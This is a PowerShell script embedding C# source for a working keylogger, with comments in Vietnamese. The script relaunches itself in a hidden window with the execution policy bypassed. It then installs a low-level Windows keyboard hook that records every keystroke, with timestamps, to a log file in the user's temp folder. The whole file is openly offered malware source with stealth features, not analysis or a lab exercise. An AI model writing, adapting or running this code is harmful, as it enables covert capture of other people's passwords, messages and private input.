if (-not $env:TEST_PS1_HIDDEN) {
    $env:TEST_PS1_HIDDEN = "1"

    Start-Process powershell.exe `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" `
        -WindowStyle Hidden

    exit
}


$cSource = @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

public class SimpleKeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logPath;

    public static void Start(string logPath) {
        _logPath = logPath;
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
        // Vòng lặp thông điệp Windows Forms để duy trì hook
        Application.Run();
    }

    public static void Stop() {
        UnhookWindowsHookEx(_hookID);
        Application.ExitThread();
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string keyLog = string.Format("{0},{1}\n", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), (Keys)vkCode);
            File.AppendAllText(_logPath, keyLog);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@

# Nạp kiểu dữ liệu C# vào phiên làm việc PowerShell
Add-Type -TypeDefinition $cSource -ReferencedAssemblies System.Windows.Forms, System.Drawing

# Đường dẫn tệp log đầu ra
$LogFile = "$env:TEMP\key.log"
Set-Content -Path $LogFile -Value "Time,Key"

# Khởi chạy bắt phím (Lưu ý: Application.Run() sẽ chiếm luồng hiện tại, cần chạy Job hoặc Runspace nếu muốn ngắt tự động)
Write-Host "Đang bắt đầu ghi nhận phím. Nhấn đóng cửa sổ hoặc dừng tiến trình để kết thúc."
[SimpleKeyLogger]::Start($LogFile)
